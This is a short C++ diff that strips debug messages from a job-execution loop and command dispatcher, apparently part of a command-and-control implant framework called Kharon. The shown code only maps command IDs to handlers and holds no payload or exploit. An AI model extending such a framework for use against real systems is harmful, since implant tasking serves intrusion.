@@ -158,9 +158,7 @@ auto DECLFN Jobs::ExecuteAll( VOID ) -> VOID {
             KhDbg( "executing command id: %d", Current->CmdID );
 
             Current->State    = KH_JOB_RUNNING;
-            KhDbg("%p", Current);
             ERROR_CODE Result = Self->Jbs->Execute( Current );
-            KH_DBG_MSG
             Current->ExitCode = Result;
             Current->State    = KH_JOB_READY_SEND;
 
@@ -176,14 +174,9 @@ auto DECLFN Jobs::Execute(
 ) -> ERROR_CODE {
     G_KHARON
 
-    KH_DBG_MSG
-
     for ( INT i = 0; i < TSK_LENGTH; i++ ) {
-        KH_DBG_MSG
         if ( Job->CmdID == Self->Tsk->Mgmt[i].ID ) {
-            KH_DBG_MSG
             return ( Self->Tsk->*Self->Tsk->Mgmt[i].Run )( Job );
-            KH_DBG_MSG
         }
     }
 
